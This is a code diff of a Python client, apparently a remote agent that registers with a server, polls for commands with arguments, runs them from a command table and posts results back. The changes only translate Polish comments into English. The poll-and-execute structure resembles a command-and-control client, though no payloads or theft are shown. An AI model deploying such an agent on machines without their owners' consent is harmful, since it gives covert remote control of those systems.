@@ -66,10 +66,7 @@ class Client:
 
     def send_data(self, data, *args):
 
-        # enc_data = base64.b64encode((str(data).replace('\'', '"')).encode('cp852')).decode('cp852')
-
-        # dla pl jezyka po chcp w cmd.exe mamy 852, dla innych są inne.
-        # mozna by zrobić dopasowanie kodowania
+        # get system CP (default for PL: 852, and set variable here)
 
         if args and args[0]:
             say_catch_file = requests.post(
@@ -107,10 +104,9 @@ class Client:
         status_code = get_status.status_code
         print(status_code, status_message)
         if status_code == 400:
-            #tutaj jakiś raise zrobić
+            # Add raise
             print('Unable to register client!')
             exit()
-
 
 
 class Command:
@@ -279,15 +275,14 @@ def main():
         print(f'Received commands (basing on command_id\'s): {received_com_id}')
         print(f'Sent commands (basing on command_id\'s): {sent_com_id}')
         # List of available commands
-        # co zrobić jak jest none? Wywala się
-        # chodzi o parametry startowe, może dać jakis string?
+        # 'None' can flip whole script! (None as command params)
         get_job = client.get_data()
         com = get_job.get('last_command')
         com_args = literal_eval(get_job.get('last_command_args'))
         com_id = get_job['last_command_id']
         if any(i in com for i in com_dict):
             if com_id not in (received_com_id and sent_com_id):
-                #ZROB COS
+                # Do something
                 com_to_run = com_dict[com]
                 if com_args:
                     com_result = com_to_run(**com_args)
